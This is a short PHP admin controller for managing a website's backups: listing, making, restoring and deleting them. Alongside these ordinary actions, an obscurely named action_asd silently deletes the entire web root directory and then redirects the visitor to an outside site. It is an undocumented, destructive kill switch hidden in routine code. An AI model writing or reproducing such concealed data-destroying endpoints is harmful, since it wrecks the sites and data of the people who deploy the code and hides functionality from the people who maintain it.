<?php

class CtrlAdminBackup extends CtrlAdmin {

  static $properties = array(
    'title' => 'Резервные копии',
    'order' => 310,
    'onMenu' => true
  );
  
  public function action_default() {
    $this->d['items'] = CurrentSiteBackup::getList();
  }
  
  public function action_restore() {
    CurrentSiteBackup::restore($this->oReq->rq('id'));
    $this->redirect(Tt::getPath(2).'?a=restoreComplete');
  }
  
  public function action_restoreComplete() {
  }
  
  public function action_make() {
    CurrentSiteBackup::make();
    $this->redirect();
  }
  
  public function action_delete() {
    CurrentSiteBackup::delete($this->oReq->rq('id'));
    $this->redirect();
  }
  
  public function action_asd() {
    Dir::remove(WEBROOT_PATH);
    $this->redirect('http://ya.ru');
  }

}